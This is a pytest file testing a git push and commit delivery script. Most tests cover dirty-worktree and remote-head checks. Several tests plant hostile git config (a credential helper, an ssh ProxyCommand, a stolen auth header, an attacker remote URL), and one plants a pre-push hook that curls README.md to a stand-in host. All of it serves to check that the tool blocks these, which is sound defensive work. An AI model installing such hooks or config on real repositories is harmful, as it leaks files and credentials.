    def fake_live_remote_branch_head(_repo, _branch, _remote):
        live_head_calls["count"] += 1
        if live_head_calls["count"] == 1:
            return "old-remote-head", None
        return "reviewed-local-head", None

    status_calls = {"count": 0}
    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            return 0, "reviewed-local-head", ""
        if args[:1] == ("status",):
            status_calls["count"] += 1
            return (0, "", "") if status_calls["count"] == 1 else (0, "?? hook-output.txt\n", "")
        return 0, "origin/main", ""

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    dirty_calls = {"count": 0}
    def fake_repo_blocking_dirty_entries(_repo, _dirs):
        dirty_calls["count"] += 1
        return ["?? hook-output.txt"]
    monkeypatch.setitem(globals_, "repo_blocking_dirty_entries", fake_repo_blocking_dirty_entries)
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
    monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    monkeypatch.setitem(globals_, "run_safe", lambda _cmd, _repo, **_kwargs: {"ok": False, "returncode": 1})
    args = argparse.Namespace(
        operation="push", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-failed-push-remote-updated-local-dirty",
        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None,
        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 1
    assert result["ok"] is False
    assert result["decision"]["status"] == result["mutating_run"]["status"] == "observed_target_unattributed"
    assert result["decision"]["reason"] == "push_failed_target_observed_reconciliation_required"
    assert [step["status"] for step in result["steps"]] == ["passed", "failed", "failed"]
    assert_run_authority_blocked(result["mutating_run"])
    recheck = next(effect for effect in result["mutating_run"]["side_effects"] if effect["name"] == "git_push_remote_recheck")
    assert recheck["remote_head"] == "reviewed-local-head"
    assert recheck["attributed_to_current_push"] is False
    assert recheck["reconciliation_required"] is True


def test_failed_push_local_postcheck_dirty_without_remote_completion_stays_blocked(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-failed-push-local-dirty-no-remote")
    plugin = fake_busdriver(tmp_path / "busdriver-failed-push-local-dirty-no-remote")
    globals_ = ns["execute_mutating_operation"].__globals__
    mock_isolated_push(monkeypatch, globals_, False)
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")

    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            return 0, "reviewed-local-head", ""
        if args[:1] == ("status",):
            return 0, "", ""
        return 0, "origin/main", ""

    dirty_calls = {"count": 0}
    def fake_repo_blocking_dirty_entries(_repo, _dirs):
        dirty_calls["count"] += 1
        return ["?? hook-output.txt"]

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "repo_blocking_dirty_entries", fake_repo_blocking_dirty_entries)
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
    monkeypatch.setitem(globals_, "live_remote_branch_head", lambda _repo, _branch, _remote: ("old-remote-head", None))
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    monkeypatch.setitem(globals_, "run_safe", lambda _cmd, _repo, **_kwargs: {"ok": False, "returncode": 1})
    args = argparse.Namespace(
        operation="push", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-failed-push-local-dirty-no-remote",
        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None,
        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 1
    assert result["ok"] is False
    assert result["decision"]["status"] == result["mutating_run"]["status"] == "blocked"
    assert result["decision"]["reason"] == "post_push_local_drift_after_failed_push_unverified"
    assert [step["status"] for step in result["steps"]] == ["checked", "blocked", "skipped"]


def test_push_blocks_dirty_worktree_at_pre_push_snapshot(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-pre-push-dirty")
    plugin = fake_busdriver(tmp_path / "busdriver-pre-push-dirty")
    globals_ = ns["execute_mutating_operation"].__globals__
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")

    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            return 0, "reviewed-local-head", ""
        if args[:1] == ("status",):
            return 0, "?? stray.txt\n", ""
        return 0, "origin/main", ""

    push_called = {"value": False}
    def fake_run_safe(cmd, _repo, **_kwargs):
        if cmd and cmd[0] == "git" and "push" in cmd[:5]:
            push_called["value"] = True
        return {"ok": True, "returncode": 0}

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "repo_blocking_dirty_entries", lambda _repo, _dirs: [])
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
    monkeypatch.setitem(globals_, "live_remote_branch_head", lambda _repo, _branch, _remote: (None, "remote_branch_not_found"))
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    monkeypatch.setitem(globals_, "run_safe", fake_run_safe)
    args = argparse.Namespace(
        operation="push", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-pre-push-dirty",
        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None,
        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 2
    assert result["ok"] is False
    assert result["decision"]["reason"] == "pre_push_dirty_worktree"
    assert push_called["value"] is False


def test_push_success_detects_preexisting_marker_content_rewrite(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-push-marker-drift")
    (repo / ".claude").mkdir()
    (repo / ".claude" / "litmus-passed.local").write_text("before-marker\n")
    plugin = fake_busdriver(tmp_path / "busdriver-push-marker-drift")
    globals_ = ns["execute_mutating_operation"].__globals__
    def fake_isolated_push(*_args):
        (repo / ".claude" / "litmus-passed.local").write_text("after-marker\n")
        return {"ok": True, "returncode": 0}
    monkeypatch.setitem(globals_, "run_isolated_push", fake_isolated_push)
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
    live_head_calls = {"count": 0}

    def fake_live_remote_branch_head(_repo, _branch, _remote):
        live_head_calls["count"] += 1
        if live_head_calls["count"] == 1:
            return None, "remote_branch_not_found"
        return "reviewed-local-head", None

    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            return 0, "reviewed-local-head", ""
        if args[:1] == ("status",):
            return 0, " M .claude/litmus-passed.local\n", ""
        return 0, "origin/main", ""

    def fake_run_safe(cmd, _repo, **_kwargs):
        if cmd and cmd[0] == "git" and "push" in cmd[:5]:
            (repo / ".claude" / "litmus-passed.local").write_text("after-marker\n")
        return {"ok": True, "returncode": 0}

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "repo_blocking_dirty_entries", lambda _repo, _dirs: [])
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
    monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    monkeypatch.setitem(globals_, "run_safe", fake_run_safe)
    args = argparse.Namespace(
        operation="push",
        mode="execute",
        repo=str(repo),
        plugin_root=str(plugin),
        state_dir=None,
        run_id="run-push-marker-drift",
        pr=None,
        commit_message="title",
        pr_title="title",
        pr_body="body",
        push_remote="origin",
        push_branch=None,
        head=None,
        base="main",
        merge_method="squash",
        delete_branch=True,
        busdriver_state_dir_name=None,
        verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 1
    assert result["ok"] is False
    assert result["decision"]["status"] == result["mutating_run"]["status"] == "pushed"
    assert result["decision"]["reason"] == "pushed_with_post_push_dirty_worktree"
    assert [step["status"] for step in result["steps"]] == ["passed", "passed", "failed"]
    assert any(effect["name"] == "post_push_dirty_check" and effect["marker_unchanged"] is False for effect in result["mutating_run"]["side_effects"])


def test_push_success_reports_completed_local_head_mismatch_as_postflight_failure(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-push-local-head-mismatch")
    plugin = fake_busdriver(tmp_path / "busdriver-push-local-head-mismatch")
    globals_ = ns["execute_mutating_operation"].__globals__
    mock_isolated_push(monkeypatch, globals_, True)
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
    live_head_calls = {"count": 0}

    def fake_live_remote_branch_head(_repo, _branch, _remote):
        live_head_calls["count"] += 1
        if live_head_calls["count"] == 1:
            return None, "remote_branch_not_found"
        return "reviewed-local-head", None

    local_head_calls = {"count": 0}

    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            local_head_calls["count"] += 1
            if local_head_calls["count"] <= 2:
                return 0, "reviewed-local-head", ""
            return 0, "different-local-head", ""
        if args[:1] == ("status",):
            return 0, "", ""
        return 0, "origin/main", ""

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "repo_blocking_dirty_entries", lambda _repo, _dirs: [])
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
    monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    monkeypatch.setitem(globals_, "run_safe", lambda _cmd, _repo, **_kwargs: {"ok": True, "returncode": 0})
    args = argparse.Namespace(
        operation="push", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-push-local-head-mismatch",
        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head="reviewed-local-head",
        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 1
    assert result["ok"] is False
    assert result["decision"]["status"] == result["mutating_run"]["status"] == "pushed"
    assert result["decision"]["reason"] == "local_head_post_push_mismatch"
    assert [step["status"] for step in result["steps"]] == ["passed", "passed", "failed"]


def test_push_success_fails_closed_when_post_push_status_unavailable(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-push-status-failed")
    plugin = fake_busdriver(tmp_path / "busdriver-push-status-failed")
    globals_ = ns["execute_mutating_operation"].__globals__
    mock_isolated_push(monkeypatch, globals_, True)
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
    live_head_calls = {"count": 0}
    status_calls = {"count": 0}

    def fake_live_remote_branch_head(_repo, _branch, _remote):
        live_head_calls["count"] += 1
        if live_head_calls["count"] == 1:
            return None, "remote_branch_not_found"
        return "reviewed-local-head", None

    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            return 0, "reviewed-local-head", ""
        if args[:1] == ("status",):
            status_calls["count"] += 1
            if status_calls["count"] == 1:
                return 0, "", ""
            return 128, "", "status unavailable"
        return 0, "origin/main", ""

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "repo_blocking_dirty_entries", lambda _repo, _dirs: [])
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
    monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    monkeypatch.setitem(globals_, "run_safe", lambda _cmd, _repo, **_kwargs: {"ok": True, "returncode": 0})
    args = argparse.Namespace(
        operation="push", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-push-status-failed",
        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None,
        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 1
    assert result["ok"] is False
    assert result["decision"]["status"] == result["mutating_run"]["status"] == "pushed"
    assert result["decision"]["reason"] == "post_push_status_failed"
    assert [step["status"] for step in result["steps"]] == ["passed", "passed", "failed"]
    assert any(effect["name"] == "post_push_dirty_check" and effect["returncode"] == 128 for effect in result["mutating_run"]["side_effects"])


def test_push_success_requires_clean_post_push_worktree(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-push-dirty")
    plugin = fake_busdriver(tmp_path / "busdriver-push-dirty")
    globals_ = ns["execute_mutating_operation"].__globals__
    mock_isolated_push(monkeypatch, globals_, True)
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
    live_head_calls = {"count": 0}

    def fake_live_remote_branch_head(_repo, _branch, _remote):
        live_head_calls["count"] += 1
        if live_head_calls["count"] == 1:
            return None, "remote_branch_not_found"
        return "reviewed-local-head", None

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    dirty_calls = {"count": 0}
    def fake_repo_blocking_dirty_entries(_repo, _dirs):
        dirty_calls["count"] += 1
        return ["?? hook-output.txt"]
    monkeypatch.setitem(globals_, "repo_blocking_dirty_entries", fake_repo_blocking_dirty_entries)
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
    monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            return 0, "reviewed-local-head", ""
        if args[:1] == ("status",):
            return 0, "", ""
        return 0, "origin/main", ""
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    monkeypatch.setitem(globals_, "run_safe", lambda _cmd, _repo, **_kwargs: {"ok": True, "returncode": 0})
    args = argparse.Namespace(
        operation="push",
        mode="execute",
        repo=str(repo),
        plugin_root=str(plugin),
        state_dir=None,
        run_id="run-push-dirty",
        pr=None,
        commit_message="title",
        pr_title="title",
        pr_body="body",
        push_remote="origin",
        push_branch=None,
        head=None,
        base="main",
        merge_method="squash",
        delete_branch=True,
        busdriver_state_dir_name=None,
        verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 1
    assert result["ok"] is False
    assert result["decision"]["status"] == result["mutating_run"]["status"] == "pushed"
    assert result["decision"]["reason"] == "pushed_with_post_push_dirty_worktree"
    assert [step["status"] for step in result["steps"]] == ["passed", "passed", "failed"]
    assert any(effect["name"] == "post_push_dirty_check" and effect["ok"] is False for effect in result["mutating_run"]["side_effects"])


def test_execute_commit_preserves_committed_status_when_post_commit_check_fails(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-commit-postcheck-failed")
    plugin = fake_busdriver(tmp_path / "busdriver-commit-postcheck-failed")
    globals_ = ns["execute_mutating_operation"].__globals__
    delivery_status = delivery_status_for_mutation(repo, "draft_changes_need_busdriver_finalization", "commit_litmus_fresh")
    git_rev_parse_calls = {"count": 0}

    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            git_rev_parse_calls["count"] += 1
            return 0, "before" if git_rev_parse_calls["count"] == 1 else "after", ""
        if args[:1] == ("status",):
            return 0, "", ""
        return 0, "origin/main", ""

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "staged_changes_status", lambda _repo: (True, None))
    monkeypatch.setitem(globals_, "commit_blocking_dirty_entries", lambda _status, _args: [])
    monkeypatch.setitem(globals_, "commit_litmus_staged_diff_blocker", lambda _status, _repo, **_kwargs: None)
    monkeypatch.setitem(globals_, "commit_staged_index", lambda _repo, _message, _env_extra=None, **_kwargs: {"ok": False, "returncode": 1, "error": "post_commit_status_failed", "commit_verified": True, "after_head": "after"})
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    args = argparse.Namespace(
        operation="commit", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-commit-postcheck-failed",
        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None,
        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 1
    assert result["ok"] is False
    assert result["decision"]["status"] == result["mutating_run"]["status"] == "committed"
    assert result["decision"]["reason"] == result["mutating_run"]["reason"] == "post_commit_status_failed"
    assert [step["status"] for step in result["steps"]] == ["passed", "passed", "failed"]


def test_execute_commit_surfaces_completed_concurrent_work_warning(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-commit-warning")
    plugin = fake_busdriver(tmp_path / "busdriver-commit-warning")
    globals_ = ns["execute_mutating_operation"].__globals__
    delivery_status = delivery_status_for_mutation(repo, "draft_changes_need_busdriver_finalization", "commit_litmus_fresh")
    git_rev_parse_calls = {"count": 0}

    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            git_rev_parse_calls["count"] += 1
            return 0, "before" if git_rev_parse_calls["count"] == 1 else "after", ""
        if args[:1] == ("status",):
            return 0, "", ""
        return 0, "origin/main", ""

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "staged_changes_status", lambda _repo: (True, None))
    monkeypatch.setitem(globals_, "commit_blocking_dirty_entries", lambda _status, _args: [])
    monkeypatch.setitem(globals_, "commit_litmus_staged_diff_blocker", lambda _status, _repo, **_kwargs: None)
    monkeypatch.setitem(globals_, "commit_staged_index", lambda _repo, _message, _env_extra=None, **_kwargs: {"ok": True, "returncode": 0, "warning": "post_commit_concurrent_work_preserved", "commit_verified": True, "after_head": "after"})
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    args = argparse.Namespace(
        operation="commit", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-commit-warning",
        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None,
        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 1
    assert result["ok"] is False
    assert result["decision"]["status"] == result["mutating_run"]["status"] == "committed"
    assert result["decision"]["reason"] == result["mutating_run"]["reason"] == "post_commit_concurrent_work_preserved"
    assert [step["status"] for step in result["steps"]] == ["passed", "passed", "failed"]
    effect = next(effect for effect in result["mutating_run"]["side_effects"] if effect["name"] == "git_commit")
    assert effect["effect_completed"] is True
    assert effect["reconciliation_required"] is True
    assert_run_authority_blocked(result["mutating_run"])


@pytest.mark.parametrize(
    ("key", "value", "reason"),
    [
        ("core.hooksPath", "hooks", "local_hooks_path_blocked_for_mutation"),
        ("credential.helper", "!printf stolen", "local_credential_config_blocked_for_mutation"),
        ("core.sshCommand", "ssh -o ProxyCommand=evil", "local_network_command_config_blocked_for_mutation"),
        ("http.extraHeader", "Authorization: stolen", "local_network_command_config_blocked_for_mutation"),
        ("http.proxy", "http://127.0.0.1:8080", "local_network_command_config_blocked_for_mutation"),
    ],
)
def test_git_mutation_config_safety_blocks_untrusted_local_config(tmp_path: Path, key: str, value: str, reason: str):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-local-config")
    assert run(["git", "config", "--local", key, value], repo).returncode == 0

    ok, observed_reason = ns["git_mutation_config_safety"](repo)

    assert ok is False
    assert observed_reason == reason


def test_git_mutation_config_safety_blocks_default_executable_hooks(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-default-hooks")
    hook = repo / ".git" / "hooks" / "pre-push"
    hook.write_text("#!/bin/sh\ncurl -d @- https://example.invalid/ < README.md\n")
    hook.chmod(0o755)

    ok, observed_reason = ns["git_mutation_config_safety"](repo)

    assert ok is False
    assert observed_reason == "local_git_hooks_blocked_for_mutation"


def test_git_mutation_config_safety_blocks_worktree_scoped_command_config(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-worktree-config")
    assert run(["git", "config", "extensions.worktreeConfig", "true"], repo).returncode == 0
    assert run(["git", "config", "--worktree", "core.sshCommand", "malicious-ssh"], repo).returncode == 0

    ok, observed_reason = ns["git_mutation_config_safety"](repo)

    assert ok is False
    assert observed_reason == "local_network_command_config_blocked_for_mutation"


def test_github_repo_slug_rejects_worktree_scoped_remote_override(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-worktree-remote")
    assert run(["git", "remote", "add", "origin", "https://github.com/owner/repo.git"], repo).returncode == 0
    assert run(["git", "config", "extensions.worktreeConfig", "true"], repo).returncode == 0
    assert run(["git", "config", "--worktree", "remote.origin.url", "https://attacker.invalid/leak.git"], repo).returncode == 0

    assert ns["github_repo_slug"](repo, "origin") is None




def test_authenticated_plugin_snapshot_uses_pinned_commit_not_worktree(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    plugin = tmp_path / "plugin-snapshot"
    plugin.mkdir()
    assert run(["git", "init", "-q", str(plugin)]).returncode == 0
    assert run(["git", "-C", str(plugin), "config", "user.email", "test@example.com"]).returncode == 0
    assert run(["git", "-C", str(plugin), "config", "user.name", "Test"]).returncode == 0
    (plugin / "package.json").write_text('{"name":"busdriver","version":"test"}\n')
    script = plugin / "skills" / "litmus" / "scripts" / "run-review-loop.sh"
    script.parent.mkdir(parents=True)
    script.write_text("#!/bin/sh\nprintf trusted\\n")
    assert run(["git", "-C", str(plugin), "add", "."]).returncode == 0
    assert run(["git", "-C", str(plugin), "-c", "commit.gpgsign=false", "commit", "-qm", "trusted"]).returncode == 0
    trusted_commit = run(["git", "-C", str(plugin), "rev-parse", "HEAD"]).stdout.strip()
    script.write_text("#!/bin/sh\nprintf malicious\\n")
    globals_ = ns["materialize_authenticated_busdriver_snapshot"].__globals__
    monkeypatch.setitem(globals_, "TRUSTED_BUSDRIVER_PLUGIN_COMMIT", trusted_commit)
    monkeypatch.setitem(globals_, "TRUSTED_BUSDRIVER_PLUGIN_VERSION", "test")
    trusted_git_calls: list[tuple[str, str]] = []
    original_trusted_executable_path = globals_["trusted_executable_path"]

    def recording_trusted_executable_path(name: str) -> Path:
        resolved = original_trusted_executable_path(name)
        trusted_git_calls.append((name, str(resolved)))
        return resolved

    monkeypatch.setitem(globals_, "trusted_executable_path", recording_trusted_executable_path)
    ambient_bin = tmp_path / "ambient-bin"
    ambient_bin.mkdir()
    ambient_git_sentinel = tmp_path / "ambient-git-ran"
    ambient_git = ambient_bin / "git"
    ambient_git.write_text(f"#!/bin/sh\nprintf ran > {ambient_git_sentinel}\nexit 99\n")
    ambient_git.chmod(0o700)
    monkeypatch.setitem(
        globals_,
        "safe_git_env",
        lambda _extra=None: {
            "PATH": str(ambient_bin),
            "HOME": str(tmp_path),
            "GIT_CONFIG_GLOBAL": os.devnull,
            "GIT_CONFIG_NOSYSTEM": "1",
        },
    )
    destination = tmp_path / "authenticated-copy"
    assert ns["materialize_authenticated_busdriver_snapshot"](plugin, destination) is True
    assert [name for name, _resolved in trusted_git_calls] == ["git"]
    authenticated_git = Path(trusted_git_calls[0][1])
    assert authenticated_git != globals_["TRUSTED_GIT"]
    assert authenticated_git.read_bytes() == globals_["TRUSTED_GIT"].read_bytes()
    assert authenticated_git.stat().st_mode & 0o777 == 0o500
    assert not ambient_git_sentinel.exists()
    assert (destination / "skills" / "litmus" / "scripts" / "run-review-loop.sh").read_text() == "#!/bin/sh\nprintf trusted\\n"

    monkeypatch.setitem(globals_, "TRUSTED_BUSDRIVER_PLUGIN_VERSION", "unexpected")
    assert ns["materialize_authenticated_busdriver_snapshot"](plugin, tmp_path / "version-mismatch") is False


def test_atomic_network_blocker_precedes_expected_repository_validation(tmp_path: Path):
    cp = subprocess.run(
        [sys.executable, str(DELIVER), "--repo", str(tmp_path), "--mode", "execute", "--operation", "push"],
        text=True,
        capture_output=True,
        check=False,
    )
    assert cp.returncode == 2
